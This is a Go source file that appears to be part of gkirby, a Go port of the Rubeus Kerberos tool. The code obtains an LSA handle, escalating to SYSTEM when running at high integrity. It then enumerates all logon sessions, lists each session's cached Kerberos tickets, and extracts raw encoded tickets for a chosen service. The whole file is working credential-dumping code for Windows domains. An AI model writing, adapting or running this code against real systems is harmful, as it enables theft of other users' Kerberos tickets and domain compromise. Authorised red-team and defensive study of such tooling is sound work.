package lsa

import (
	"fmt"
	"time"
	"unsafe"

	"github.com/ziggoon/gkirby/dll"
	"github.com/ziggoon/gkirby/helpers"
	"github.com/ziggoon/gkirby/types"
	"golang.org/x/sys/windows"
)

func GetLsaHandle() (windows.Handle, error) {
	isHighIntegrity := helpers.IsHighIntegrity()
	isSystem := helpers.IsSystem()

	fmt.Printf("obtaining LSA handle\n high integrity: %t\n is system: %t\n", isHighIntegrity, isSystem)

	var lsaHandle windows.Handle
	if isHighIntegrity && !isSystem {
		fmt.Printf("process is high integrity, but not system\n")
		helpers.GetSystem()
	}

	ret, _, err := dll.LsaConnectUntrusted.Call(
		uintptr(unsafe.Pointer(&lsaHandle)),
	)
	if ret != 0 {
		return lsaHandle, fmt.Errorf("LsaConnectUntrusted failed: %v", err)
	}

	isSystem = helpers.IsSystem()
	if !isSystem {
		fmt.Printf("not system for some reason\n")
	} else {
		fmt.Printf("should be system\n")
	}

	return lsaHandle, nil
}

func GetAuthenticationPackage(lsaHandle windows.Handle, lsaString *types.LsaString) (uint32, error) {
	var authPackage uint32

	ret, _, err := dll.LsaLookupAuthenticationPackage.Call(
		uintptr(lsaHandle),
		uintptr(unsafe.Pointer(lsaString)),
		uintptr(unsafe.Pointer(&authPackage)),
	)
	if ret != 0 {
		return authPackage, fmt.Errorf("LsaLookupAuthenticationPackage failed: %v", err)
	}

	return authPackage, nil
}

func EnumerateTickets(lsaHandle windows.Handle, authPackage uint32) ([]types.SessionCred, error) {
	var luids []windows.LUID
	var sessionCreds []types.SessionCred

	isHighIntegrity := helpers.IsHighIntegrity()

	if isHighIntegrity {
		luids, _ = enumerateLogonSessions()
	} else {
		luid, err := getCurrentLUID()
		if err != nil {
			return sessionCreds, fmt.Errorf("failed to get current luid: %v", err)
		}
		luids = append(luids, luid)
	}

	for _, luid := range luids {
		//value := uint64(luid.HighPart)<<32 | uint64(luid.LowPart)
		//fmt.Printf("[+] current luid: 0x%x\n", value)

		sessionData, err := getLogonSessionData(luid)
		if err != nil {
			return sessionCreds, fmt.Errorf("[-] failed to get logon session data, err: %v\n", err)
		}

		var sessionCred types.SessionCred
		sessionCred.LogonSession = *sessionData
		sessionCred.Tickets = []types.KrbTicket{}

		var responsePtr uintptr
		pResponsePtr := unsafe.Pointer(&responsePtr)
		var returnLength = 0
		var protocolStatus = 0

		var ticketCacheRequest types.KerbQueryTktCacheRequest
		ticketCacheRequest.MessageType = types.KerbQueryTicketCacheExMessage

		if isHighIntegrity {
			ticketCacheRequest.LogonId = sessionData.LogonID
		} else {
			// https://github.com/GhostPack/Rubeus/blob/master/Rubeus/lib/LSA.cs#L303
			ticketCacheRequest.LogonId = windows.LUID{LowPart: 0, HighPart: 0}
		}

		var padding uint32 = 0

		requestSize := unsafe.Sizeof(ticketCacheRequest) + unsafe.Sizeof(padding)
		buffer := make([]byte, requestSize)

		*(*types.KerbQueryTktCacheRequest)(unsafe.Pointer(&buffer[0])) = ticketCacheRequest

		ret, _, err := dll.LsaCallAuthenticationPackage.Call(
			uintptr(lsaHandle),
			uintptr(authPackage),
			uintptr(unsafe.Pointer(&ticketCacheRequest)),
			uintptr(unsafe.Sizeof(ticketCacheRequest)),
			uintptr(pResponsePtr),
			uintptr(unsafe.Pointer(&returnLength)),
			uintptr(unsafe.Pointer(&protocolStatus)),
		)
		if ret != 0 {
			return sessionCreds, fmt.Errorf("[-] LsaCallAuthenticationPackage failed, err: %v\n", err)
		}

		if responsePtr != 0 {
			defer dll.LsaFreeReturnBuffer.Call(responsePtr)

			response := (*types.KerbQueryTktCacheResponse)(unsafe.Pointer(responsePtr))

			if response.CountOfTickets > 0 {
				ticketSize := unsafe.Sizeof(types.KerbTicketCacheInfoEx{})

				for i := uint32(0); i < response.CountOfTickets; i++ {
					currentTicketPtr := responsePtr + 8 + uintptr(i)*ticketSize
					ticketInfo := (*types.KerbTicketCacheInfoEx)(unsafe.Pointer(currentTicketPtr))

					ticket := &types.KrbTicket{
						StartTime:      helpers.FileTimeToTime(ticketInfo.StartTime),
						EndTime:        helpers.FileTimeToTime(ticketInfo.EndTime),
						RenewTime:      helpers.FileTimeToTime(ticketInfo.RenewTime),
						TicketFlags:    types.TicketFlags(ticketInfo.TicketFlags),
						EncryptionType: ticketInfo.EncryptionType,
						ServerName:     types.LsaStrToString(ticketInfo.ServerName),
						ServerRealm:    types.LsaStrToString(ticketInfo.ServerRealm),
						ClientName:     types.LsaStrToString(ticketInfo.ClientName),
						ClientRealm:    types.LsaStrToString(ticketInfo.ClientRealm),
					}

					sessionCred.Tickets = append(sessionCred.Tickets, *ticket)
				}
			}
		}
		sessionCreds = append(sessionCreds, sessionCred)
	}

	return sessionCreds, nil
}

func ExtractTicket(lsaHandle windows.Handle, authPackage uint32, luid windows.LUID, targetName string) ([]byte, error) {
	if lsaHandle == 0 {
		return nil, fmt.Errorf("invalid LSA handle")
	}

	targetNameUTF16 := windows.StringToUTF16(targetName)
	nameLen := uint16(len(targetNameUTF16) * 2)

	requestSize := unsafe.Sizeof(types.KerbRetrieveTktRequest{})
	totalSize := requestSize + uintptr(nameLen)

	buffer := make([]byte, totalSize)
	bufferPtr := unsafe.Pointer(&buffer[0])

	request := (*types.KerbRetrieveTktRequest)(bufferPtr)
	request.MessageType = types.KerbRetrieveEncodedTicketMessage

	if helpers.IsSystem() {
		request.LogonId = luid
	} else {
		request.LogonId = windows.LUID{LowPart: 0, HighPart: 0}
	}
	request.TicketFlags = 0
	request.CacheOptions = 8
	request.EncryptionType = 0
	request.CredentialsHandle = types.SecurityHandle{}

	targetNamePtr := uintptr(bufferPtr) + requestSize

	stringData := unsafe.Slice((*byte)(unsafe.Pointer(&targetNameUTF16[0])), nameLen)
	targetSlice := unsafe.Slice((*byte)(unsafe.Pointer(targetNamePtr)), nameLen)
	copy(targetSlice, stringData)

	request.TargetName = types.LsaString{
		Length:        nameLen - 2,
		MaximumLength: nameLen,
		Buffer:        targetNamePtr,
	}

	fmt.Printf("ticket request struct: \n%+v\n", request)

	var responsePtr uintptr
	var returnLength uint32
	var protocolStatus uint32

	ret, _, _ := dll.LsaCallAuthenticationPackage.Call(
		uintptr(lsaHandle),
		uintptr(authPackage),
		uintptr(bufferPtr),
		totalSize,
		uintptr(unsafe.Pointer(&responsePtr)),
		uintptr(unsafe.Pointer(&returnLength)),
		uintptr(unsafe.Pointer(&protocolStatus)),
	)

	if ret != 0 {
		return nil, fmt.Errorf("LsaCallAuthenticationPackage failed: 0x%x", ret)
	}

	if protocolStatus != 0 {
		return nil, fmt.Errorf("protocol status error: 0x%x", protocolStatus)
	}

	if responsePtr != 0 {
		defer dll.LsaFreeReturnBuffer.Call(responsePtr)
		response := (*types.KerbRetrieveTktResponse)(unsafe.Pointer(responsePtr))
		encodedTicketSize := response.Ticket.EncodedTicketSize

		if encodedTicketSize > 0 {
			encodedTicket := make([]byte, encodedTicketSize)
			copy(encodedTicket,
				(*[1 << 30]byte)(unsafe.Pointer(response.Ticket.EncodedTicket))[:encodedTicketSize])

			return encodedTicket, nil
		}
	} else {
	}

	return nil, fmt.Errorf("KRB_RETRIEVE_TKT_RESPONSE failed")
}

func enumerateLogonSessions() ([]windows.LUID, error) {
	var count uint32
	var luids uintptr

	ret, _, _ := dll.LsaEnumerateLogonSessions.Call(
		uintptr(unsafe.Pointer(&count)),
		uintptr(unsafe.Pointer(&luids)),
	)

	if ret != 0 {
		return nil, fmt.Errorf("LsaEnumerateLogonSessions failed with error: 0x%x", ret)
	}

	luidSlice := make([]windows.LUID, count)
	for i := uint32(0); i < count; i++ {
		luid := (*windows.LUID)(unsafe.Pointer(luids + uintptr(i)*unsafe.Sizeof(windows.LUID{})))
		luidSlice[i] = *luid
	}

	defer dll.LsaFreeReturnBuffer.Call(luids)
	return luidSlice, nil
}

func getCurrentLUID() (windows.LUID, error) {
	var currentToken windows.Token
	err := windows.OpenProcessToken(windows.CurrentProcess(), windows.TOKEN_QUERY, &currentToken)
	if err != nil {
		return windows.LUID{}, fmt.Errorf("OpenProcessToken failed: %v", err)
	}
	defer currentToken.Close()

	var tokenStats types.TokenStatistics
	var returnLength uint32

	err = windows.GetTokenInformation(currentToken, windows.TokenStatistics, (*byte)(unsafe.Pointer(&tokenStats)), uint32(unsafe.Sizeof(tokenStats)), &returnLength)
	if err != nil {
		return windows.LUID{}, fmt.Errorf("GetTokenInformation failed: %v", err)
	}

	return tokenStats.AuthenticationId, nil
}

func getLogonSessionData(luid windows.LUID) (*types.LogonSessionData, error) {
	var sessionDataPtr uintptr

	ret, _, _ := dll.LsaGetLogonSessionData.Call(
		uintptr(unsafe.Pointer(&luid)),
		uintptr(unsafe.Pointer(&sessionDataPtr)),
	)

	if ret != 0 {
		return nil, fmt.Errorf("LsaGetLogonSessionData failed with error: 0x%x", ret)
	}

	defer dll.LsaFreeReturnBuffer.Call(sessionDataPtr)

	sessionData := (*types.SecurityLogonSessionData)(unsafe.Pointer(sessionDataPtr))

	result := &types.LogonSessionData{
		LogonID:               sessionData.LoginID,
		Username:              types.LsaStrToString(sessionData.Username),
		LogonDomain:           types.LsaStrToString(sessionData.LoginDomain),
		AuthenticationPackage: types.LsaStrToString(sessionData.AuthenticationPackage),
		LogonType:             types.LogonType(sessionData.LogonType),
		Session:               int32(sessionData.Session),
		LogonTime:             time.Unix(0, int64(sessionData.LoginTime)*100),
		LogonServer:           types.LsaStrToString(sessionData.LogonServer),
		DnsDomainName:         types.LsaStrToString(sessionData.DnsDomainName),
		Upn:                   types.LsaStrToString(sessionData.Upn),
	}

	if sessionData.PSiD != 0 {
		var sidStr *uint16
		err := windows.ConvertSidToStringSid((*windows.SID)(unsafe.Pointer(sessionData.PSiD)), &sidStr)
		if err == nil {
			result.Sid, _ = windows.StringToSid(windows.UTF16PtrToString(sidStr))
			windows.LocalFree(windows.Handle(unsafe.Pointer(sidStr)))
		}
	}

	return result, nil
}

/*
func parseTicketData(ticketData []byte) (*types.KrbCred, error) {
	// todo: implement asn.1 unmarshaling
	var krbCred types.KrbCred
	err := krbCred.Unmarshal(ticketData)
	if err != nil {
		fmt.Printf("[-] Failed to unmarshal KrbCred with error: %v\n", err)
		return nil, err
	}

	fmt.Printf("[+] Parsed KrbCred with: %+v\n", krbCred)

	return nil, nil
}
*/
